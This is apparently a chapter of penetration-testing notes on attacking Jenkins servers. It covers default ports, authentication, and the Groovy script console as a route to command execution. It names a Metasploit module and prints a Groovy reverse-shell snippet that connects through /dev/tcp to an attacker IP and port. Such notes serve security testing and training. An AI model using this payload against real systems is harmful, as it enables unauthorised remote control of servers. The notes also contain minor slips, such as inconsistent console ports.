\chapter{Jenkins}
Jenkins is an open-source automation server written in Java that helps
developers build and test their software projects continuously. It is a
server-based system that runs in servlet containers such as Tomcat. Over the
years, researchers have uncovered various vulnerabilities in Jenkins, including
some that allow for remote code execution without requiring authentication.
Jenkins is a continuous integration server.a


\section{Discovery/Footprinting}

Jenkins runs on Tomcat port 8080 by default. It also utilizes port 5000 to
attach slave servers. This port is used to communicate between masters and
slaves. Jenkins can use a local database, LDAP, Unix user database, delegate
security to a servlet container, or use no authentication at all.


\section{Enumeration}
The default installation typically uses Jenkins’ database to store credentials
and does not allow users to register an account. 




\section{Script Console}
The script console can be reached at the URL \verb+http://URL:8000/script+.
This console allows a user to run Apache
\href{https://en.wikipedia.org/wiki/Apache_Groovy}{Groovy scripts}, which are
an object-oriented Java-compatible language. The language is similar to Python
and Ruby. Groovy source code gets compiled into Java Bytecode and can run on
any platform that has JRE installed.

Using this script console, it is possible to run arbitrary commands,
functioning similarly to a web shell.




There are various ways that access to the script console can be leveraged to
gain a reverse shell. For example,
\verb+exploit/multi/http/jenkins_script_console+  metasploit module or by using
this script that creats a rshell
\begin{verbatim}
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/iIP/PORT;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
\end{verbatim}


\section{Miscellaneous Vulnerabilities}
